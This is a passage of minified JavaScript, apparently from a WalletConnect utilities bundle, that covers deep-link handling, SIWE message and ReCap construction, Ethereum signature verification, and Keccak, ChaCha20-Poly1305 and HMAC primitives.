if(t.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${t}`)}function BD(t){return V_("topic",t)}function UD(t){return V_("id",t)}function K_(t){const[e,r]=t.split(":"),n={id:void 0,topic:void 0};if(e==="topic"&&typeof r=="string")n.topic=r;else if(e==="id"&&Number.isInteger(Number(r)))n.id=Number(r);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${r}`);return n}function lr(t,e){return se.fromMiliseconds(Date.now()+se.toMiliseconds(t))}function Fs(t){return Date.now()>=se.toMiliseconds(t)}function it(t,e){return`${t}${e?`:${e}`:""}`}function sd(t=[],e=[]){return[...new Set([...t,...e])]}async function $D({id:t,topic:e,wcDeepLink:r}){var n;try{if(!r)return;const i=typeof r=="string"?JSON.parse(r):r,s=i==null?void 0:i.href;if(typeof s!="string")return;const o=LD(s,t,e),a=Zl();if(a===Tn.browser){if(!((n=Xo.getDocument())!=null&&n.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}FD(o)}else a===Tn.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(i){console.error(i)}}function LD(t,e,r){const n=`requestId=${e}&sessionTopic=${r}`;t.endsWith("/")&&(t=t.slice(0,-1));let i=`${t}`;if(t.startsWith("https://t.me")){const s=t.includes("?")?"&startapp=":"?startapp=";i=`${i}${s}${HD(n,!0)}`}else i=`${i}/wc?${n}`;return i}function FD(t){let e="_self";zD()?e="_top":(qD()||t.startsWith("https://")||t.startsWith("http://"))&&(e="_blank"),window.open(t,e,"noreferrer noopener")}async function jD(t,e){let r="";try{if(Jl()&&(r=localStorage.getItem(e),r))return r;r=await t.getItem(e)}catch(n){console.error(n)}return r}function wb(t,e){if(!t.includes(e))return null;const r=t.split(/([&,?,=])/),n=r.indexOf(e);return r[n+2]}function bb(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})}function ey(){return typeof process<"u"&&bD.IS_VITEST==="true"}function qD(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function zD(){try{return window.self!==window.top}catch{return!1}}function HD(t,e=!1){const r=Buffer.from(t).toString("base64");return e?r.replace(/[=]/g,""):r}function Q_(t){return Buffer.from(t,"base64").toString("utf-8")}function WD(t){return new Promise(e=>setTimeout(e,t))}function Wu(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function GD(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Xl(t,...e){if(!GD(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function ty(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");Wu(t.outputLen),Wu(t.blockLen)}function dc(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Y_(t,e){Xl(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const Rh=BigInt(2**32-1),vb=BigInt(32);function VD(t,e=!1){return e?{h:Number(t&Rh),l:Number(t>>vb&Rh)}:{h:Number(t>>vb&Rh)|0,l:Number(t&Rh)|0}}function KD(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=VD(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const QD=(t,e,r)=>t<<r|e>>>32-r,YD=(t,e,r)=>e<<r|t>>>32-r,JD=(t,e,r)=>e<<r-32|t>>>64-r,ZD=(t,e,r)=>t<<r-32|e>>>64-r,Sa=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function XD(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function Vp(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Ei(t,e){return t<<32-e|t>>>e}const Eb=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function e5(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function Ab(t){for(let e=0;e<t.length;e++)t[e]=e5(t[e])}function t5(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function fc(t){return typeof t=="string"&&(t=t5(t)),Xl(t),t}function r5(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];Xl(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}let ry=class{clone(){return this._cloneInto()}};function J_(t){const e=n=>t().update(fc(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function Lc(t=32){if(Sa&&typeof Sa.getRandomValues=="function")return Sa.getRandomValues(new Uint8Array(t));if(Sa&&typeof Sa.randomBytes=="function")return Sa.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const Z_=[],X_=[],eC=[],n5=BigInt(0),iu=BigInt(1),i5=BigInt(2),s5=BigInt(7),o5=BigInt(256),a5=BigInt(113);for(let t=0,e=iu,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],Z_.push(2*(5*n+r)),X_.push((t+1)*(t+2)/2%64);let i=n5;for(let s=0;s<7;s++)e=(e<<iu^(e>>s5)*a5)%o5,e&i5&&(i^=iu<<(iu<<BigInt(s))-iu);eC.push(i)}const[c5,u5]=KD(eC,!0),_b=(t,e,r)=>r>32?JD(t,e,r):QD(t,e,r),Cb=(t,e,r)=>r>32?ZD(t,e,r):YD(t,e,r);function l5(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,u=r[c],l=r[c+1],h=_b(u,l,1)^r[a],d=Cb(u,l,1)^r[a+1];for(let g=0;g<50;g+=10)t[o+g]^=h,t[o+g+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=X_[o],c=_b(i,s,a),u=Cb(i,s,a),l=Z_[o];i=t[l],s=t[l+1],t[l]=c,t[l+1]=u}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=c5[n],t[1]^=u5[n]}r.fill(0)}let h5=class tC extends ry{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,Wu(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=XD(this.state)}keccak(){Eb||Ab(this.state32),l5(this.state32,this.rounds),Eb||Ab(this.state32),this.posOut=0,this.pos=0}update(e){dc(this);const{blockLen:r,state:n}=this;e=fc(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){dc(this,!1),Xl(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Wu(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(Y_(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new tC(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const d5=(t,e,r)=>J_(()=>new h5(e,t,r)),f5=d5(1,136,256/8),p5="https://rpc.walletconnect.org/v1";function rC(t){const e=`Ethereum Signed Message:
${t.length}`,r=new TextEncoder().encode(e+t);return"0x"+Buffer.from(f5(r)).toString("hex")}async function g5(t,e,r,n,i,s){switch(r.t){case"eip191":return await m5(t,e,r.s);case"eip1271":return await y5(t,e,r.s,n,i,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${r.t}`)}}async function m5(t,e,r){return(await bk({hash:rC(e),signature:r})).toLowerCase()===t.toLowerCase()}async function y5(t,e,r,n,i,s){const o=ic(n);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${n}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",u="0000000000000000000000000000000000000000000000000000000000000041",l=r.substring(2),h=rC(e).substring(2),d=a+h+c+u+l,g=await fetch(`${s||p5}/?chainId=${n}&projectId=${i}`,{method:"POST",body:JSON.stringify({id:w5(),jsonrpc:"2.0",method:"eth_call",params:[{to:t,data:d},"latest"]})}),{result:y}=await g.json();return y?y.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function w5(){return Date.now()+Math.floor(Math.random()*1e3)}function b5(t){const e=atob(t),r=new Uint8Array(e.length);for(let o=0;o<e.length;o++)r[o]=e.charCodeAt(o);const n=r[0];if(n===0)throw new Error("No signatures found");const i=1+n*64;if(r.length<i)throw new Error("Transaction data too short for claimed signature count");if(r.length<100)throw new Error("Transaction too short");const s=Buffer.from(t,"base64").slice(1,65);return $_.encode(s)}var v5=Object.defineProperty,E5=Object.defineProperties,A5=Object.getOwnPropertyDescriptors,Ib=Object.getOwnPropertySymbols,_5=Object.prototype.hasOwnProperty,C5=Object.prototype.propertyIsEnumerable,xb=(t,e,r)=>e in t?v5(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,I5=(t,e)=>{for(var r in e||(e={}))_5.call(e,r)&&xb(t,r,e[r]);if(Ib)for(var r of Ib(e))C5.call(e,r)&&xb(t,r,e[r]);return t},x5=(t,e)=>E5(t,A5(e));const S5="did:pkh:",ny=t=>t==null?void 0:t.split(":"),N5=t=>{const e=t&&ny(t);if(e)return t.includes(S5)?e[3]:e[1]},Rm=t=>{const e=t&&ny(t);if(e)return e[2]+":"+e[3]},kd=t=>{const e=t&&ny(t);if(e)return e.pop()};async function Sb(t){const{cacao:e,projectId:r}=t,{s:n,p:i}=e,s=nC(i,i.iss),o=kd(i.iss);return await g5(o,s,n,Rm(i.iss),r)}const nC=(t,e)=>{const r=`${t.domain} wants you to sign in with your Ethereum account:`,n=kd(e);if(!t.aud&&!t.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let i=t.statement||void 0;const s=`URI: ${t.aud||t.uri}`,o=`Version: ${t.version}`,a=`Chain ID: ${N5(e)}`,c=`Nonce: ${t.nonce}`,u=`Issued At: ${t.iat}`,l=t.exp?`Expiration Time: ${t.exp}`:void 0,h=t.nbf?`Not Before: ${t.nbf}`:void 0,d=t.requestId?`Request ID: ${t.requestId}`:void 0,g=t.resources?`Resources:${t.resources.map(m=>`
- ${m}`).join("")}`:void 0,y=od(t.resources);if(y){const m=Gu(y);i=U5(i,m)}return[r,n,"",i,"",s,o,a,c,u,l,h,d,g].filter(m=>m!=null).join(`
`)};function T5(t){return Buffer.from(JSON.stringify(t)).toString("base64")}function P5(t){return JSON.parse(Buffer.from(t,"base64").toString("utf-8"))}function ta(t){if(!t)throw new Error("No recap provided, value is undefined");if(!t.att)throw new Error("No `att` property found");const e=Object.keys(t.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(r=>{const n=t.att[r];if(Array.isArray(n))throw new Error(`Resource must be an object: ${r}`);if(typeof n!="object")throw new Error(`Resource must be an object: ${r}`);if(!Object.keys(n).length)throw new Error(`Resource object is empty: ${r}`);Object.keys(n).forEach(i=>{const s=n[i];if(!Array.isArray(s))throw new Error(`Ability limits ${i} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${i} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${i}) must be an array of objects, found: ${o}`)})})})}function R5(t,e,r,n={}){return r==null||r.sort((i,s)=>i.localeCompare(s)),{att:{[t]:O5(e,r,n)}}}function O5(t,e,r={}){e=e==null?void 0:e.sort((i,s)=>i.localeCompare(s));const n=e.map(i=>({[`${t}/${i}`]:[r]}));return Object.assign({},...n)}function iC(t){return ta(t),`urn:recap:${T5(t).replace(/=/g,"")}`}function Gu(t){const e=P5(t.replace("urn:recap:",""));return ta(e),e}function k5(t,e,r){const n=R5(t,e,r);return iC(n)}function D5(t){return t&&t.includes("urn:recap:")}function M5(t,e){const r=Gu(t),n=Gu(e),i=B5(r,n);return iC(i)}function B5(t,e){ta(t),ta(e);const r=Object.keys(t.att).concat(Object.keys(e.att)).sort((i,s)=>i.localeCompare(s)),n={att:{}};return r.forEach(i=>{var s,o;Object.keys(((s=t.att)==null?void 0:s[i])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[i])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,u;n.att[i]=x5(I5({},n.att[i]),{[a]:((c=t.att[i])==null?void 0:c[a])||((u=e.att[i])==null?void 0:u[a])})})}),n}function U5(t="",e){ta(e);const r="I further authorize the stated URI to perform the following actions on my behalf: ";if(t.includes(r))return t;const n=[];let i=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(h=>({ability:h.split("/")[0],action:h.split("/")[1]}));c.sort((h,d)=>h.action.localeCompare(d.action));const u={};c.forEach(h=>{u[h.ability]||(u[h.ability]=[]),u[h.ability].push(h.action)});const l=Object.keys(u).map(h=>(i++,`(${i}) '${h}': '${u[h].join("', '")}' for '${a}'.`));n.push(l.join(", ").replace(".,","."))});const s=n.join(" "),o=`${r}${s}`;return`${t?t+" ":""}${o}`}function Nb(t){var e;const r=Gu(t);ta(r);const n=(e=r.att)==null?void 0:e.eip155;return n?Object.keys(n).map(i=>i.split("/")[1]):[]}function Tb(t){const e=Gu(t);ta(e);const r=[];return Object.values(e.att).forEach(n=>{Object.values(n).forEach(i=>{var s;(s=i==null?void 0:i[0])!=null&&s.chains&&r.push(i[0].chains)})}),[...new Set(r.flat())]}function od(t){if(!t)return;const e=t==null?void 0:t[t.length-1];return D5(e)?e:void 0}function Kp(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function sC(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function In(t,...e){if(!sC(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function Pb(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function $5(t,e){In(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}function Rb(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}const Ys=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),L5=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),F5=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!F5)throw new Error("Non little-endian hardware is not supported");function j5(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function Om(t){if(typeof t=="string")t=j5(t);else if(sC(t))t=km(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function q5(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function z5(t,e){if(t.length!==e.length)return!1;let r=0;for(let n=0;n<t.length;n++)r|=t[n]^e[n];return r===0}const H5=(t,e)=>{function r(n,...i){if(In(n),t.nonceLength!==void 0){const u=i[0];if(!u)throw new Error("nonce / iv required");t.varSizeNonce?In(u):In(u,t.nonceLength)}const s=t.tagLength;s&&i[1]!==void 0&&In(i[1]);const o=e(n,...i),a=(u,l)=>{if(l!==void 0){if(u!==2)throw new Error("cipher output not supported");In(l)}};let c=!1;return{encrypt(u,l){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,In(u),a(o.encrypt.length,l),o.encrypt(u,l)},decrypt(u,l){if(In(u),s&&u.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,l),o.decrypt(u,l)}}}return Object.assign(r,t),r};function Ob(t,e,r=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(r&&!W5(e))throw new Error("invalid output, must be aligned");return e}function kb(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s);t.setUint32(e+4,o,n),t.setUint32(e+0,a,n)}function W5(t){return t.byteOffset%4===0}function km(t){return Uint8Array.from(t)}function pc(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}const oC=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),G5=oC("expand 16-byte k"),V5=oC("expand 32-byte k"),K5=Ys(G5),Q5=Ys(V5);function Ge(t,e){return t<<e|t>>>32-e}function Dm(t){return t.byteOffset%4===0}const Oh=64,Y5=16,aC=2**32-1,Db=new Uint32Array;function J5(t,e,r,n,i,s,o,a){const c=i.length,u=new Uint8Array(Oh),l=Ys(u),h=Dm(i)&&Dm(s),d=h?Ys(i):Db,g=h?Ys(s):Db;for(let y=0;y<c;o++){if(t(e,r,n,l,o,a),o>=aC)throw new Error("arx: counter overflow");const m=Math.min(Oh,c-y);if(h&&m===Oh){const b=y/4;if(y%4!==0)throw new Error("arx: invalid block position");for(let A=0,_;A<Y5;A++)_=b+A,g[_]=d[_]^l[A];y+=Oh;continue}for(let b=0,A;b<m;b++)A=y+b,s[A]=i[A]^u[b];y+=m}}function Z5(t,e){const{allowShortKeys:r,extendNonceFn:n,counterLength:i,counterRight:s,rounds:o}=q5({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return Kp(i),Kp(o),Rb(s),Rb(r),(a,c,u,l,h=0)=>{In(a),In(c),In(u);const d=u.length;if(l===void 0&&(l=new Uint8Array(d)),In(l),Kp(h),h<0||h>=aC)throw new Error("arx: counter overflow");if(l.length<d)throw new Error(`arx: output (${l.length}) is shorter than data (${d})`);const g=[];let y=a.length,m,b;if(y===32)g.push(m=km(a)),b=Q5;else if(y===16&&r)m=new Uint8Array(32),m.set(a),m.set(a,16),b=K5,g.push(m);else throw new Error(`arx: invalid 32-byte key, got length=${y}`);Dm(c)||g.push(c=km(c));const A=Ys(m);if(n){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");n(b,A,Ys(c.subarray(0,16)),A),c=c.subarray(16)}const _=16-i;if(_!==c.length)throw new Error(`arx: nonce must be ${_} or 16 bytes`);if(_!==12){const P=new Uint8Array(12);P.set(c,s?0:12-c.length),c=P,g.push(c)}const T=Ys(c);return J5(t,b,A,T,u,l,h,o),pc(...g),l}}const Sr=(t,e)=>t[e++]&255|(t[e++]&255)<<8;class X5{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=Om(e),In(e,32);const r=Sr(e,0),n=Sr(e,2),i=Sr(e,4),s=Sr(e,6),o=Sr(e,8),a=Sr(e,10),c=Sr(e,12),u=Sr(e,14);this.r[0]=r&8191,this.r[1]=(r>>>13|n<<3)&8191,this.r[2]=(n>>>10|i<<6)&7939,this.r[3]=(i>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|u<<8)&8191,this.r[9]=u>>>5&127;for(let l=0;l<8;l++)this.pad[l]=Sr(e,16+2*l)}process(e,r,n=!1){const i=n?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],u=o[2],l=o[3],h=o[4],d=o[5],g=o[6],y=o[7],m=o[8],b=o[9],A=Sr(e,r+0),_=Sr(e,r+2),T=Sr(e,r+4),P=Sr(e,r+6),S=Sr(e,r+8),C=Sr(e,r+10),O=Sr(e,r+12),$=Sr(e,r+14);let D=s[0]+(A&8191),F=s[1]+((A>>>13|_<<3)&8191),j=s[2]+((_>>>10|T<<6)&8191),L=s[3]+((T>>>7|P<<9)&8191),N=s[4]+((P>>>4|S<<12)&8191),f=s[5]+(S>>>1&8191),p=s[6]+((S>>>14|C<<2)&8191),w=s[7]+((C>>>11|O<<5)&8191),E=s[8]+((O>>>8|$<<8)&8191),x=s[9]+($>>>5|i),R=0,B=R+D*a+F*(5*b)+j*(5*m)+L*(5*y)+N*(5*g);R=B>>>13,B&=8191,B+=f*(5*d)+p*(5*h)+w*(5*l)+E*(5*u)+x*(5*c),R+=B>>>13,B&=8191;let k=R+D*c+F*a+j*(5*b)+L*(5*m)+N*(5*y);R=k>>>13,k&=8191,k+=f*(5*g)+p*(5*d)+w*(5*h)+E*(5*l)+x*(5*u),R+=k>>>13,k&=8191;let v=R+D*u+F*c+j*a+L*(5*b)+N*(5*m);R=v>>>13,v&=8191,v+=f*(5*y)+p*(5*g)+w*(5*d)+E*(5*h)+x*(5*l),R+=v>>>13,v&=8191;let M=R+D*l+F*u+j*c+L*a+N*(5*b);R=M>>>13,M&=8191,M+=f*(5*m)+p*(5*y)+w*(5*g)+E*(5*d)+x*(5*h),R+=M>>>13,M&=8191;let V=R+D*h+F*l+j*u+L*c+N*a;R=V>>>13,V&=8191,V+=f*(5*b)+p*(5*m)+w*(5*y)+E*(5*g)+x*(5*d),R+=V>>>13,V&=8191;let I=R+D*d+F*h+j*l+L*u+N*c;R=I>>>13,I&=8191,I+=f*a+p*(5*b)+w*(5*m)+E*(5*y)+x*(5*g),R+=I>>>13,I&=8191;let z=R+D*g+F*d+j*h+L*l+N*u;R=z>>>13,z&=8191,z+=f*c+p*a+w*(5*b)+E*(5*m)+x*(5*y),R+=z>>>13,z&=8191;let G=R+D*y+F*g+j*d+L*h+N*l;R=G>>>13,G&=8191,G+=f*u+p*c+w*a+E*(5*b)+x*(5*m),R+=G>>>13,G&=8191;let W=R+D*m+F*y+j*g+L*d+N*h;R=W>>>13,W&=8191,W+=f*l+p*u+w*c+E*a+x*(5*b),R+=W>>>13,W&=8191;let K=R+D*b+F*m+j*y+L*g+N*d;R=K>>>13,K&=8191,K+=f*h+p*l+w*u+E*c+x*a,R+=K>>>13,K&=8191,R=(R<<2)+R|0,R=R+B|0,B=R&8191,R=R>>>13,k+=R,s[0]=B,s[1]=k,s[2]=v,s[3]=M,s[4]=V,s[5]=I,s[6]=z,s[7]=G,s[8]=W,s[9]=K}finalize(){const{h:e,pad:r}=this,n=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=i,i=e[a]>>>13,e[a]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,n[0]=e[0]+5,i=n[0]>>>13,n[0]&=8191;for(let a=1;a<10;a++)n[a]=e[a]+i,i=n[a]>>>13,n[a]&=8191;n[9]-=8192;let s=(i^1)-1;for(let a=0;a<10;a++)n[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|n[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+r[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+r[a]|0)+(o>>>16)|0,e[a]=o&65535;pc(n)}update(e){Pb(this);const{buffer:r,blockLen:n}=this;e=Om(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);if(o===n){for(;n<=i-s;s+=n)this.process(e,s);continue}r.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===n&&(this.process(r,0,!1),this.pos=0)}return this}destroy(){pc(this.h,this.r,this.buffer,this.pad)}digestInto(e){Pb(this),$5(e,this),this.finished=!0;const{buffer:r,h:n}=this;let{pos:i}=this;if(i){for(r[i++]=1;i<16;i++)r[i]=0;this.process(r,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=n[o]>>>0,e[s++]=n[o]>>>8;return e}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}}function e6(t){const e=(n,i)=>t(i).update(Om(n)).digest(),r=t(new Uint8Array(32));return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=n=>t(n),e}const t6=e6(t=>new X5(t));function r6(t,e,r,n,i,s=20){let o=t[0],a=t[1],c=t[2],u=t[3],l=e[0],h=e[1],d=e[2],g=e[3],y=e[4],m=e[5],b=e[6],A=e[7],_=i,T=r[0],P=r[1],S=r[2],C=o,O=a,$=c,D=u,F=l,j=h,L=d,N=g,f=y,p=m,w=b,E=A,x=_,R=T,B=P,k=S;for(let M=0;M<s;M+=2)C=C+F|0,x=Ge(x^C,16),f=f+x|0,F=Ge(F^f,12),C=C+F|0,x=Ge(x^C,8),f=f+x|0,F=Ge(F^f,7),O=O+j|0,R=Ge(R^O,16),p=p+R|0,j=Ge(j^p,12),O=O+j|0,R=Ge(R^O,8),p=p+R|0,j=Ge(j^p,7),$=$+L|0,B=Ge(B^$,16),w=w+B|0,L=Ge(L^w,12),$=$+L|0,B=Ge(B^$,8),w=w+B|0,L=Ge(L^w,7),D=D+N|0,k=Ge(k^D,16),E=E+k|0,N=Ge(N^E,12),D=D+N|0,k=Ge(k^D,8),E=E+k|0,N=Ge(N^E,7),C=C+j|0,k=Ge(k^C,16),w=w+k|0,j=Ge(j^w,12),C=C+j|0,k=Ge(k^C,8),w=w+k|0,j=Ge(j^w,7),O=O+L|0,x=Ge(x^O,16),E=E+x|0,L=Ge(L^E,12),O=O+L|0,x=Ge(x^O,8),E=E+x|0,L=Ge(L^E,7),$=$+N|0,R=Ge(R^$,16),f=f+R|0,N=Ge(N^f,12),$=$+N|0,R=Ge(R^$,8),f=f+R|0,N=Ge(N^f,7),D=D+F|0,B=Ge(B^D,16),p=p+B|0,F=Ge(F^p,12),D=D+F|0,B=Ge(B^D,8),p=p+B|0,F=Ge(F^p,7);let v=0;n[v++]=o+C|0,n[v++]=a+O|0,n[v++]=c+$|0,n[v++]=u+D|0,n[v++]=l+F|0,n[v++]=h+j|0,n[v++]=d+L|0,n[v++]=g+N|0,n[v++]=y+f|0,n[v++]=m+p|0,n[v++]=b+w|0,n[v++]=A+E|0,n[v++]=_+x|0,n[v++]=T+R|0,n[v++]=P+B|0,n[v++]=S+k|0}const n6=Z5(r6,{counterRight:!1,counterLength:4,allowShortKeys:!1}),i6=new Uint8Array(16),Mb=(t,e)=>{t.update(e);const r=e.length%16;r&&t.update(i6.subarray(r))},s6=new Uint8Array(32);function Bb(t,e,r,n,i){const s=t(e,r,s6),o=t6.create(s);i&&Mb(o,i),Mb(o,n);const a=new Uint8Array(16),c=L5(a);kb(c,0,BigInt(i?i.length:0),!0),kb(c,8,BigInt(n.length),!0),o.update(a);const u=o.digest();return pc(s,a),u}const o6=t=>(e,r,n)=>({encrypt(i,s){const o=i.length;s=Ob(o+16,s,!1),s.set(i);const a=s.subarray(0,-16);t(e,r,a,a,1);const c=Bb(t,e,r,a,n);return s.set(c,o),pc(c),s},decrypt(i,s){s=Ob(i.length-16,s,!1);const o=i.subarray(0,-16),a=i.subarray(-16),c=Bb(t,e,r,o,n);if(!z5(a,c))throw new Error("invalid tag");return s.set(i.subarray(0,-16)),t(e,r,s,s,1),pc(c),s}}),cC=H5({blockSize:64,nonceLength:12,tagLength:16},o6(n6));let uC=class extends ry{constructor(e,r){super(),this.finished=!1,this.destroyed=!1,ty(e);const n=fc(r);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(n.length>i?e.create().update(n).digest():n);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return 